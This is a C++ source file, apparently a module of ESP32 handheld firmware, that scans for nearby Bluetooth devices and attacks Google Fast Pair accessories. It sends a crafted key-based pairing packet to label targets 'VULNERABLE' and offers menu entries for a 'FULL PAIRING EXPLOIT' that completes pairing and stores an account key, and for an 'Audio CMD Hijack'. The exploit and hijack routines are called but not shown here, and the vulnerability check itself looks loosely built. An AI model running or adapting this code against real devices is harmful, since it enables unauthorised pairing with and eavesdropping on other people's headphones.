#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "fastpair_crypto.h"
#include <globals.h>
#include "core/display.h"
#include "core/mykeyboard.h"

extern std::vector<String> fastPairDevices;
bool returnToMenu = false;

bool requireSimpleConfirmation(const char* message) {
    drawMainBorderWithTitle("CONFIRM");
    padprintln(message);
    padprintln("");
    padprintln("Press SEL to confirm");
    padprintln("or ESC to cancel");

    while(true) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", TFT_WHITE);
            delay(1000);
            return false;
        }

        if(check(SelPress)) {
            displayMessage("Confirmed!", "", "", "", TFT_WHITE);
            delay(500);
            return true;
        }

        delay(50);
    }
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", TFT_WHITE);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);

    esp_fill_random(&packet[8], 8);

    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);

    if(pChar->writeValue(packet, 16, false)) {
        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();

        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
            return true;
        } else {
            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

String selectTargetFromScan(const char* title) {
    struct BLE_Device {
        std::string address;
        std::string name;
        int rssi;
    };
    
    std::vector<BLE_Device> foundDevices;
    bool scanning = false;
    uint32_t scanStartTime = 0;
    
    foundDevices.clear();
    
    NimBLEDevice::deinit(true);
    NimBLEDevice::init("");

    NimBLEScan* pScan = NimBLEDevice::getScan();
    pScan->clearResults();
    
    class SimpleScanCallbacks : public NimBLEScanCallbacks {
        std::vector<BLE_Device>& devices;
    public:
        SimpleScanCallbacks(std::vector<BLE_Device>& devs) : devices(devs) {}
        
        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
            BLE_Device device;
            device.address = advertisedDevice->getAddress().toString();
            device.name = advertisedDevice->getName();
            device.rssi = advertisedDevice->getRSSI();

            if(device.name.empty()) {
                device.name = "Unknown";
            }

            bool exists = false;
            for(auto& dev : devices) {
                if(dev.address == device.address) {
                    exists = true;
                    dev.rssi = device.rssi;
                    break;
                }
            }

            if(!exists) {
                devices.push_back(device);
            }
        }

        void onScanEnd(NimBLEScanResults results) {
            scanning = false;
        }
    };

    pScan->setScanCallbacks(new SimpleScanCallbacks(foundDevices));
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->setMaxResults(0);

    scanning = true;
    scanStartTime = millis();
    uint32_t scanTime = 5000;
    pScan->start(scanTime / 1000, nullptr, false);

    while(scanning) {
        tft.fillScreen(bruceConfig.bgColor);
        drawMainBorderWithTitle(title);
        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);

        uint32_t elapsed = millis() - scanStartTime;
        uint32_t remaining = (scanTime > elapsed) ? scanTime - elapsed : 0;

        padprintln("Found: " + String(foundDevices.size()));
        padprintln("Time: " + String(remaining / 1000) + "s");
        padprintln("");
        padprintln("Scanning for devices...");
        padprintln("ESC: Cancel");

        int progress = (elapsed * 100) / scanTime;
        if(progress > 100) progress = 100;

        tft.fillRect(20, 140, tftWidth - 40, 10, TFT_DARKGREY);
        tft.fillRect(20, 140, ((tftWidth - 40) * progress) / 100, 10, TFT_GREEN);

        if(check(EscPress)) {
            pScan->stop();
            scanning = false;
            NimBLEDevice::deinit(true);
            return "";
        }

        delay(100);
    }

    if(foundDevices.empty()) {
        displayMessage("NO DEVICES", "Found 0 devices", "", "", TFT_YELLOW);
        delay(2000);
        NimBLEDevice::deinit(true);
        return "";
    }

    int currentIndex = 0;
    bool redraw = true;
    String selectedMAC = "";

    while(selectedMAC.isEmpty()) {
        if(check(EscPress)) {
            break;
        }

        if(redraw) {
            tft.fillScreen(bruceConfig.bgColor);
            drawMainBorderWithTitle("SELECT DEVICE");
            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);

            padprintln("Found: " + String(foundDevices.size()));
            padprintln("Device " + String(currentIndex + 1) + "/" + String(foundDevices.size()));
            padprintln("");

            if(currentIndex < foundDevices.size()) {
                BLE_Device& dev = foundDevices[currentIndex];
                padprintln("Name: " + String(dev.name.c_str()));
                padprintln("MAC: " + String(dev.address.c_str()));
                padprintln("RSSI: " + String(dev.rssi) + " dBm");
            }

            padprintln("");
            padprintln("PREV/NEXT: Navigate");
            padprintln("SEL: Select device");
            padprintln("ESC: Cancel");

            redraw = false;
        }

        delay(50);

        if(check(PrevPress)) {
            if(currentIndex > 0) {
                currentIndex--;
                redraw = true;
            }
        } else if(check(NextPress)) {
            if(currentIndex < foundDevices.size() - 1) {
                currentIndex++;
                redraw = true;
            }
        } else if(check(SelPress)) {
            if(currentIndex < foundDevices.size()) {
                selectedMAC = String(foundDevices[currentIndex].address.c_str());
            }
        }
    }

    NimBLEDevice::deinit(true);
    return selectedMAC;
}

void testFastPairVulnerability() {
    String selectedMAC = selectTargetFromScan("SELECT TARGET");
    if(selectedMAC.isEmpty()) return;

    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);

    if(!requireSimpleConfirmation("Test vulnerability?")) {
        return;
    }

    bool vulnerable = attemptKeyBasedPairing(target);

    Serial.printf("[WhisperPair] %s - %s\n", 
        selectedMAC.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );

    delay(3000);
}

void whisperPairMenu() {
    std::vector<Option> options;
    returnToMenu = false;

    options.push_back({"[🔍] Scan & Test", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[$$] Full Pair Test", []() {
        if(!requireSimpleConfirmation("FULL PAIRING EXPLOIT")) return;

        String selectedMAC = selectTargetFromScan("SELECT TARGET");
        if(selectedMAC.isEmpty()) return;

        NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);

        displayMessage("Starting full exploit...", "", "", "", TFT_WHITE);
        padprintln("1. Connect to device");
        padprintln("2. ECDH key exchange");
        padprintln("3. Complete pairing");
        padprintln("4. Store account key");

        if(!requireSimpleConfirmation("CONFIRM FULL EXPLOIT")) return;

        bool success = whisperPairFullExploit(target);

        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", TFT_WHITE);
            displayMessage("Device paired", "", "", "", TFT_WHITE);
        } else {
            displayMessage("Exploit failed", "", "", "", TFT_WHITE);
            displayMessage("May be patched", "", "", "", TFT_WHITE);
        }
        delay(3000);
    }});

    options.push_back({"[🎤] Audio CMD Hijack", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"[ECDH] Crypto Benchmark", []() {
        fastpair_benchmark();
        padprintln("");
        padprintln("Press any key");
        while(!check(AnyKeyPress)) delay(50);
    }});

    options.push_back({"Back", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
}